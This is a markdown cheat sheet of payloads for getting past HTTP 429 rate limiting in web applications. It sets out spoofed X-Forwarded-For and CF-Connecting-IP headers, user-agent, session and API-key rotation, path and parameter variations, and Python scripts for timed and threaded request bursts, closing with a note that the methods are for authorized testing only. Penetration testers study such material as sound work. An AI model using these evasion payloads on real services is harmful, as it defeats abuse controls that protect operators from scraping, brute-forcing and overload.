# HTTP 429 Too Many Requests Bypass Techniques

Below are various payloads and techniques to bypass rate limiting (429 errors) when testing web applications. These methods attempt to circumvent request throttling by manipulating different aspects of the HTTP protocol.

## Basic Rate Limit Bypass Techniques

### 1. IP Rotation
```http
GET /api/v1/data HTTP/1.1
Host: example.com
X-Forwarded-For: 1.1.1.1
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
X-Forwarded-For: 2.2.2.2
```

### 2. Header Manipulation
```http
GET /api/v1/data HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)
```

## Advanced Bypass Techniques

### 3. Protocol Switching
```http
GET /api/v1/data HTTP/2
Host: example.com
```

```http
GET /api/v1/data HTTP/1.0
Host: example.com
Connection: keep-alive
```

### 4. Parameter Pollution
```http
GET /api/v1/data?bypass=1 HTTP/1.1
Host: example.com
```

```http
GET /api/v1/data?cache=1625097600 HTTP/1.1
Host: example.com
```

### 5. Path Variations
```http
GET /API/v1/data HTTP/1.1
Host: example.com
```

```http
GET /api/V1/data HTTP/1.1
Host: example.com
```

## Header-Based Bypasses

### 6. Session Rotation
```http
GET /api/v1/data HTTP/1.1
Host: example.com
Cookie: session=abc123
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
Cookie: session=def456
```

### 7. Accept Header Manipulation
```http
GET /api/v1/data HTTP/1.1
Host: example.com
Accept: application/json
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
Accept: text/xml
```

## Timing-Based Bypasses

### 8. Randomized Delay
```python
import requests
import random
import time

for i in range(100):
    requests.get("https://example.com/api/v1/data")
    time.sleep(random.uniform(0.1, 2.5))
```

### 9. Burst Requests
```python
import requests
from threading import Thread

def make_request():
    requests.get("https://example.com/api/v1/data")

threads = [Thread(target=make_request) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
```

## Cloud-Based Bypasses

### 10. CDN Headers
```http
GET /api/v1/data HTTP/1.1
Host: example.com
CF-Connecting-IP: 8.8.8.8
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
X-Forwarded-Host: example.com
```

## API Key Rotation

### 11. Multiple API Keys
```http
GET /api/v1/data HTTP/1.1
Host: example.com
Authorization: Bearer key1
```

```http
GET /api/v1/data HTTP/1.1
Host: example.com
Authorization: Bearer key2
```

## Testing Methodology

1. Identify rate limit thresholds
2. Test different IP addresses/proxies
3. Rotate user agents and headers
4. Experiment with request timing
5. Try protocol version switching
6. Test path normalization variations
7. Attempt parameter pollution
8. Verify cookie/session handling

## Important Notes

- These techniques should only be used in authorized testing
- Rate limit bypass may violate terms of service
- Some methods may require infrastructure (proxies/VPNs)
- Document all testing with proper authorization
- Respect the site's robots.txt and security.txt

Remember that rate limiting implementations vary significantly between applications. What works on one system may not work on another. Always test carefully and ethically.